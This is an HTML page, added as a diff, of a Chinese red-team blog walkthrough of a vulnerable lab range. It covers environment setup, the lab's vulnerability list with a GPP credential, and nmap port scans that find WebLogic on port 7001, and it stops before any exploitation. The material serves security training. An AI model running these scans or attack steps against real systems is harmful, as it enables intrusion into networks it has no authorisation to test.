@@ -1,0 +1,947 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+  <meta charset="utf-8">
+  
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="renderer" content="webkit">
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <meta name="format-detection" content="telephone=no,email=no,adress=no">
+  <!-- Color theme for statusbar -->
+  <meta name="theme-color" content="#000000" />
+  <!-- 强制页面在当前窗口以独立页面显示,防止别人在框架里调用页面 -->
+  <meta http-equiv="window-target" content="_top" />
+  
+  
+  <title>漏洞靶场实战-红队靶场从外网 Weblogic 打进内网，再到约束委派接管域控 | Ocean&#39;s Blog</title>
+  <meta name="description" content="从外网 Weblogic 打进内网，再到约束委派接管域控 靶场来自渗透攻击红队，官方 wp 及下载地址：https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;dcYbIfLwN-Aw0Z9XxQSGkQ 本靶场存在的漏洞： 123456789GPP：admin:admin!@#45存在 GPP 漏洞存在 MS14-068存在 CVE-2020-1472Exchange 各种漏洞都可尝试可尝试非约束">
+<meta property="og:type" content="article">
+<meta property="og:title" content="漏洞靶场实战-红队靶场从外网 Weblogic 打进内网，再到约束委派接管域控">
+<meta property="og:url" content="https://oceansec.github.io/2023/12/05/%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98-%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E4%BB%8E%E5%A4%96%E7%BD%91%20Weblogic%20%E6%89%93%E8%BF%9B%E5%86%85%E7%BD%91%EF%BC%8C%E5%86%8D%E5%88%B0%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%8E%A5%E7%AE%A1%E5%9F%9F%E6%8E%A7/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="从外网 Weblogic 打进内网，再到约束委派接管域控 靶场来自渗透攻击红队，官方 wp 及下载地址：https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;dcYbIfLwN-Aw0Z9XxQSGkQ 本靶场存在的漏洞： 123456789GPP：admin:admin!@#45存在 GPP 漏洞存在 MS14-068存在 CVE-2020-1472Exchange 各种漏洞都可尝试可尝试非约束">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/f0d15dfa21d24dc0a4b7475c382a9706.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/58db02a27121d3854e41dda3f6774996.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/c2dac37a42c41c0cdf57d09402647c16.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/da7162af67bf32ef042224bd9c63a95f.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/73736d8709b4fbba06cac2ad68693ef3.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/139a694f259d70647dc457b13c998754.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/45f89c7633482fe0104819179880321d.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/1525634f203e6830fcfd04fd6221f8cc.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/387a4c292073f6d5452bdfaa52c6e0e0.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/d32c860123c00b3b4fd2384f9ef5ef25.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/65c0b09ca8f89bb9513db47ad100f96c.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/06c209be7dcc7ab432985a32c12b91a2.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/5c61b64ed3835c5b205efabf2a14ef41.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/8a0847cf7bfae37a8bb822fcf3fff678.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/ee406d060d9c7182a1f28a838ad7f408.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/88b6909ff8e8dd9363104cbb2ae47f0b.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/b90b151806e08a2df57d9c1a2736e292.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/e659690e8de39a69fbc6629284ed1fc9.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/3a73440dd63a370a116f890d879fb66b.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/f0db1cb9f76b182fd52b6d4c13d1a5c6.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/f88fe2b96977525b12121e0cd9e9fa5f.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/74c5b88c3e1bda17df18566042555496.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/5733fd0ae247e78ce085b23ef76677f3.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/a36422f328b7f0ccb490f9303b10f642.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/c1aa78437073208b5b07a254e74142a8.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/1e893fc7c920aa2fddf24e86af7d463d.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/c1c02b393b775f3873070238e45dec92.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/916a442af23806ca7c89784da7bf4c0a.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/24630c2ce6b77982ea9aa7c291080786.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/01bb266ebb83732c2081794d0476180f.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/8a6884eb675b6afa7e052f4bd7968742.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/1f2d5eea0895b1de259889cc6b9fcc07.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/4baa7f87ee4a04e38f6909b0c7d58a3d.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/fa5b114608f357b6f32e03f2ab861bdb.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/d2b14865a05a3f994c6339ecbe2dcda6.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/116c34bb03d87808ac292643985a8c04.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/c942aa4136fb566135a2dedc25fcef44.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/774c84d30e556aa9241040f6b1b5b127.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/9b86bb5c67caaa0eb198584eec49e631.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/a367563e507a3f034b0f0f1ccac95772.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/968eddd5fb0a1d42c28dcef289da251a.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/a1c326e00ef08d6044fbeaffee2a26fe.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/1333ef1bf22ffe4641e66e9b7c32da93.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/8cfc19e7dd68cea57c7d5b4e501c3476.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/6a4a64f75b78a08e5dd25dceb79c95cb.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/c86b9fd9c6de214ab6d1ae4f49bcb06d.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/03fdc9c84e8e7e87995b8d3c80f64d9e.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/b6c72ab3586150c1979c1565fe0529e1.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/069317cf5d6c5ce468e149e6b66148ea.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/3d8fcf2b2391f0daf9842b55a4938c85.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/1d60d5dee831bc2c8e23867617f451b4.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/498ee7ee42cf07fc69323991f67d2078.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/9bc05fd0b2ce2fbb4013621e7c05d245.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/d412192364596aaf3c2d6f7870eaeedd.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/f04f800faa76bc14fdcb66ca6b4e0eaf.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/4e58c6005c44c8dd6f21b3ea2375090a.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/307f38106054b70103329cc532fb1536.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/1a498e32d4a5036d366e0887dde0333b.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/726f210a987afbf931b7d9695bfa704a.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/5afe8cbae21133e1c7e51738c5e275fb.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/16f1fffa49d4a716d55f2c7a337faf31.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/1fece20a25a8d35fa088584fa6f91fcb.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/42c7e47bd5c09d227728b21ba0ea006a.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/d717a424deb896a4ca97a7f1f83da1f8.png">
+<meta property="article:published_time" content="2023-12-05T02:59:04.864Z">
+<meta property="article:modified_time" content="2022-08-26T13:23:56.410Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="靶场,Redteam,内网">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/f0d15dfa21d24dc0a4b7475c382a9706.png">
+  <!-- Canonical links -->
+  <link rel="canonical" href="https://oceansec.github.io/2023/12/05/%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98-%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E4%BB%8E%E5%A4%96%E7%BD%91%20Weblogic%20%E6%89%93%E8%BF%9B%E5%86%85%E7%BD%91%EF%BC%8C%E5%86%8D%E5%88%B0%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%8E%A5%E7%AE%A1%E5%9F%9F%E6%8E%A7/index.html">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png" type="image/x-icon">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+  
+  
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+
+<body class="main-center" itemscope itemtype="http://schema.org/WebPage">
+  <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+  <div class="slimContent">
+    <div class="navbar-header">
+      
+      
+      <div class="profile-block text-center">
+        <a id="avatar" href="https://github.com/oceansec" target="_blank">
+          <img class="img-circle img-rotate" src="/images/avatar.jpg" width="200" height="200">
+        </a>
+        <h2 id="name" class="hidden-xs hidden-sm">Ocean</h2>
+        <h3 id="title" class="hidden-xs hidden-sm hidden-md">Security researcher</h3>
+        <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> Beijing, China</small>
+      </div>
+      
+      <div class="search" id="search-form-wrap">
+
+    <form class="search-form sidebar-form">
+        <div class="input-group">
+            <input type="text" class="search-form-input form-control" placeholder="搜索" />
+            <span class="input-group-btn">
+                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i class="icon icon-search"></i></button>
+            </span>
+        </div>
+    </form>
+    <div class="ins-search">
+  <div class="ins-search-mask"></div>
+  <div class="ins-search-container">
+    <div class="ins-input-wrapper">
+      <input type="text" class="ins-search-input" placeholder="想要查找什么..." x-webkit-speech />
+      <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+    </div>
+    <div class="ins-section-wrapper">
+      <div class="ins-section-container"></div>
+    </div>
+  </div>
+</div>
+
+
+</div>
+      <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+    </div>
+    <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
+      <ul class="nav navbar-nav main-nav ">
+        
+        
+        <li class="menu-item menu-item-home">
+          <a href="/.">
+            
+            <i class="icon icon-home-fill"></i>
+            
+            <span class="menu-title">首页</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives">
+            
+            <i class="icon icon-archives-fill"></i>
+            
+            <span class="menu-title">归档</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories">
+            
+            <i class="icon icon-folder"></i>
+            
+            <span class="menu-title">分类</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags">
+            
+            <i class="icon icon-tags"></i>
+            
+            <span class="menu-title">标签</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-repository">
+          <a href="/repository">
+            
+            <i class="icon icon-project"></i>
+            
+            <span class="menu-title">项目</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-books">
+          <a href="/books">
+            
+            <i class="icon icon-book-fill"></i>
+            
+            <span class="menu-title">书单</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-links">
+          <a href="/links">
+            
+            <i class="icon icon-friendship"></i>
+            
+            <span class="menu-title">友链</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about">
+            
+            <i class="icon icon-cup-fill"></i>
+            
+            <span class="menu-title">关于</span>
+          </a>
+        </li>
+        
+      </ul>
+      
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/oceansec" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    </nav>
+  </div>
+</header>
+
+  
+    <aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    
+      <div class="widget">
+    <h3 class="widget-title">公告</h3>
+    <div class="widget-body">
+        <div id="board">
+            <div class="content">
+                <p>欢迎交流与分享经验!</p>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">分类</h3>
+    <div class="widget-body">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/RedTeam/">RedTeam</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Windows/">Windows</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BB%8B%E7%BB%8D/">介绍</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%86%85%E7%BD%91/">内网</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/">博客搭建</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%80%BB%E7%BB%93/">总结</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%A4%BE%E5%B7%A5/">社工</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%92%93%E9%B1%BC/">钓鱼</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%BB%91%E8%8B%B9%E6%9E%9C/">黑苹果</a><span class="category-list-count">4</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">标签</h3>
+    <div class="widget-body">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CISCN-wp/" rel="tag">CISCN,wp</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Windows/" rel="tag">Windows</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/windows-mimikatz/" rel="tag">windows,mimikatz</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BB%8B%E7%BB%8D/" rel="tag">介绍</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/" rel="tag">博客搭建</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%80%BB%E7%BB%93/" rel="tag">总结</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-%E8%B0%83%E8%AF%95/" rel="tag">环境搭建,调试</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%92%93%E9%B1%BC/" rel="tag">钓鱼</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9D%B6%E5%9C%BA-Redteam-%E5%86%85%E7%BD%91/" rel="tag">靶场,Redteam,内网</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%BB%91%E8%8B%B9%E6%9E%9C/" rel="tag">黑苹果</a><span class="tag-list-count">4</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">标签云</h3>
+    <div class="widget-body tagcloud">
+      <a href="/tags/CISCN-wp/" style="font-size: 13px;">CISCN,wp</a> <a href="/tags/Windows/" style="font-size: 13px;">Windows</a> <a href="/tags/windows-mimikatz/" style="font-size: 13px;">windows,mimikatz</a> <a href="/tags/%E4%BB%8B%E7%BB%8D/" style="font-size: 13px;">介绍</a> <a href="/tags/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/" style="font-size: 13px;">博客搭建</a> <a href="/tags/%E6%80%BB%E7%BB%93/" style="font-size: 13px;">总结</a> <a href="/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-%E8%B0%83%E8%AF%95/" style="font-size: 13px;">环境搭建,调试</a> <a href="/tags/%E9%92%93%E9%B1%BC/" style="font-size: 13px;">钓鱼</a> <a href="/tags/%E9%9D%B6%E5%9C%BA-Redteam-%E5%86%85%E7%BD%91/" style="font-size: 13px;">靶场,Redteam,内网</a> <a href="/tags/%E9%BB%91%E8%8B%B9%E6%9E%9C/" style="font-size: 14px;">黑苹果</a>
+    </div>
+  </div>
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget-body">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/12/">十二月 2023</a><span class="archive-list-count">14</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget-body">
+      <ul class="recent-post-list list-unstyled no-thumbnail">
+        
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2023/12/05/%E5%88%9D%E8%A7%81codeql/" class="title">初见codeql</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2023-12-05T03:10:27.000Z" itemprop="datePublished">2023-12-05</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/%E7%A4%BE%E5%B7%A5/">社工</a>
+              </p>
+              <p class="item-title">
+                <a href="/2023/12/05/%E9%82%AE%E4%BB%B6%E9%92%93%E9%B1%BC%E5%B0%8F%E6%80%BB%E7%BB%93/" class="title">邮件钓鱼小总结</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2023-12-05T02:59:04.866Z" itemprop="datePublished">2023-12-05</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/RedTeam/">RedTeam</a>
+              </p>
+              <p class="item-title">
+                <a href="/2023/12/05/%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98-%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E4%BB%8E%E5%A4%96%E7%BD%91%20Weblogic%20%E6%89%93%E8%BF%9B%E5%86%85%E7%BD%91%EF%BC%8C%E5%86%8D%E5%88%B0%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%8E%A5%E7%AE%A1%E5%9F%9F%E6%8E%A7/" class="title">漏洞靶场实战-红队靶场从外网 Weblogic 打进内网，再到约束委派接管域控</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2023-12-05T02:59:04.864Z" itemprop="datePublished">2023-12-05</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/%E9%BB%91%E8%8B%B9%E6%9E%9C/">黑苹果</a>
+              </p>
+              <p class="item-title">
+                <a href="/2023/12/05/%E6%9C%BA%E6%A2%B0%E9%9D%A9%E5%91%BDz2%E9%BB%91%E8%8B%B9%E6%9E%9C%E5%8F%8C%E7%B3%BB%E7%BB%9F%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/" class="title">机械革命z2黑苹果双系统改造计划</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2023-12-05T02:59:04.862Z" itemprop="datePublished">2023-12-05</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/%E4%BB%8B%E7%BB%8D/">介绍</a>
+              </p>
+              <p class="item-title">
+                <a href="/2023/12/05/%E6%96%B0%E5%8D%9A%E5%AE%A2%E4%BB%8B%E7%BB%8D%EF%BC%8C%E6%97%A7%E5%8D%9A%E5%AE%A2%E5%9C%B0%E5%9D%80%EF%BC%9Aoceansec.blog.csdn.net/" class="title">新博客介绍，旧博客地址：https://oceansec.blog.csdn.net</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2023-12-05T02:59:04.860Z" itemprop="datePublished">2023-12-05</time>
+              </p>
+            </div>
+          </li>
+          
+      </ul>
+    </div>
+  </div>
+  
+
+    
+  </div>
+</aside>
+
+  
+  
+<main class="main" role="main">
+  <div class="content">
+  <article id="post-漏洞靶场实战-红队靶场从外网 Weblogic 打进内网，再到约束委派接管域控" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
+    
+    <div class="article-header">
+      
+        
+  
+    <h1 class="article-title" itemprop="name">
+      漏洞靶场实战-红队靶场从外网 Weblogic 打进内网，再到约束委派接管域控
+    </h1>
+  
+
+      
+      <div class="article-meta">
+        <span class="article-date">
+    <i class="icon icon-calendar-check"></i>
+	<a href="/2023/12/05/%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98-%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E4%BB%8E%E5%A4%96%E7%BD%91%20Weblogic%20%E6%89%93%E8%BF%9B%E5%86%85%E7%BD%91%EF%BC%8C%E5%86%8D%E5%88%B0%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%8E%A5%E7%AE%A1%E5%9F%9F%E6%8E%A7/" class="article-date">
+	  <time datetime="2023-12-05T02:59:04.864Z" itemprop="datePublished">2023-12-05</time>
+	</a>
+</span>
+        
+  <span class="article-category">
+    <i class="icon icon-folder"></i>
+    <a class="article-category-link" href="/categories/RedTeam/">RedTeam</a>
+  </span>
+
+        
+  <span class="article-tag">
+    <i class="icon icon-tags"></i>
+	<a class="article-tag-link-link" href="/tags/%E9%9D%B6%E5%9C%BA-Redteam-%E5%86%85%E7%BD%91/" rel="tag">靶场,Redteam,内网</a>
+  </span>
+
+
+        
+
+        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2023/12/05/%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98-%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E4%BB%8E%E5%A4%96%E7%BD%91%20Weblogic%20%E6%89%93%E8%BF%9B%E5%86%85%E7%BD%91%EF%BC%8C%E5%86%8D%E5%88%B0%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%8E%A5%E7%AE%A1%E5%9F%9F%E6%8E%A7/#comments" class="article-comment-link">评论</a></span>
+        
+      </div>
+    </div>
+    <div class="article-entry marked-body" itemprop="articleBody">
+      
+        <p><img src="https://img-blog.csdnimg.cn/f0d15dfa21d24dc0a4b7475c382a9706.png"><br>从外网 Weblogic 打进内网，再到约束委派接管域控</p>
+<p>靶场来自渗透攻击红队，官方 wp 及下载地址：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/dcYbIfLwN-Aw0Z9XxQSGkQ">https://mp.weixin.qq.com/s/dcYbIfLwN-Aw0Z9XxQSGkQ</a></p>
+<p>本靶场存在的漏洞：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GPP：admin:admin!@#45</span><br><span class="line">存在 GPP 漏洞</span><br><span class="line">存在 MS14-068</span><br><span class="line">存在 CVE-2020-1472</span><br><span class="line">Exchange 各种漏洞都可尝试</span><br><span class="line">可尝试非约束委派</span><br><span class="line">可尝试约束委派</span><br><span class="line">存在 CVE-2019-1388</span><br><span class="line">存在 CVE-2019-0708</span><br></pre></td></tr></table></figure>
+
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>虚拟机文件比较大，解压之后有 74.8G，所以要保证有足够的空间，建议使用固态硬盘，解压之后直接使用 VMware 扫描虚拟机并依次获取权限</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/58db02a27121d3854e41dda3f6774996.png" alt="image-20220507102253091"></p>
+<p>网站拓扑</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/c2dac37a42c41c0cdf57d09402647c16.png" alt="图片"></p>
+<p>更新一下上图的环境</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">网关 IP：192.168.43.252</span><br><span class="line">Kali IP：192.168.43.58</span><br><span class="line">Windows 11 hacker IP：192.168.43.166</span><br><span class="line">Windows 2012 IP：192.168.43.92</span><br></pre></td></tr></table></figure>
+
+<p>发现 Windows 可以 ping 通 Kali，但是 kali 却 ping 不通，很容易想到是 Windows 的防火墙问题，关掉即可</p>
+<p>还需要注意一个问题，这里选择的是桥接模式，之前都是 nat，其实用哪一种都行</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/da7162af67bf32ef042224bd9c63a95f.png" alt="image-20220507144405849"></p>
+<p>这个图就很好地说明了之前的区别，就是使用 nat 模式的物理机是可以访问所有虚拟机的但是虚拟机无法访问物理机，使用桥接就可以相互访问，还有说如果是需要认证的校园网大概率用户不了桥接模式（虚拟机没法联网）</p>
+<p>靶机一的 weblogic 需要手动开启</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">weblogic 安装目录：C:\Oracle\Middleware\Oracle_Home\user_projects\domains\base_domain（手动运行下 startWebLogic.cmd）</span><br></pre></td></tr></table></figure>
+
+<h2 id="1-外网打点"><a href="#1-外网打点" class="headerlink" title="1.外网打点"></a>1.外网打点</h2><p>目标  IP：192.168.43.92</p>
+<p>使用 nmap 进行端口扫描服务发现</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sT -Pn 192.168.43.92</span><br></pre></td></tr></table></figure>
+
+<p>在一般实战中建议制定端口扫描，因为速度快且扫描精度高</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -v -Pn -T3 -sV -n -sT --open -p 22,1222,2222,22345,23,21,445,135,139,5985,2121,3389,13389,6379,4505,1433,3306,5000,5236,5900,5432,1521,1099,53,995,8140,993,465,878,7001,389,902,1194,1080,88 192.168.43.92</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/img_convert/73736d8709b4fbba06cac2ad68693ef3.png" alt="image-20220507152533105"></p>
+<p>发现开放了 7001 端口，即 weblogic 服务</p>
